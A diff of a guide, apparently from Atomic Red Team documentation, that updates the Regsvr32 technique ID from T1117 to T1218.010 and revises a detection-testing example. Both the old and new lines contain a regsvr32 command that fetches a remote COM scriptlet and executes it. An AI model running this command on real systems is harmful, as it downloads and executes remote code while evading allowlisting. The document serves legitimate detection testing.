@@ -37,14 +37,14 @@ matrices linking to Atomic Tests can be found here:
 
 ## Execute Test
 
-In this example we will use Technique `T1117 "Regsvr32"` and Atomic Test `"Regsvr32 remote COM scriptlet execution"`. This particular 
+In this example we will use Technique `T1218.010 "Regsvr32"` and Atomic Test `"Regsvr32 remote COM scriptlet execution"`. This particular 
 test is fairly easy to exercise since the tool is on all Windows workstations by default.
 
-The details of this test, [which are located here](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution),
+The details of this test, [which are located here](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md#atomic-test-1---regsvr32-local-com-scriptlet-execution),
 describe how you can test your detection by simply running the below command:
 
 ```
-regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
 ```
 
 ## Collect Evidence
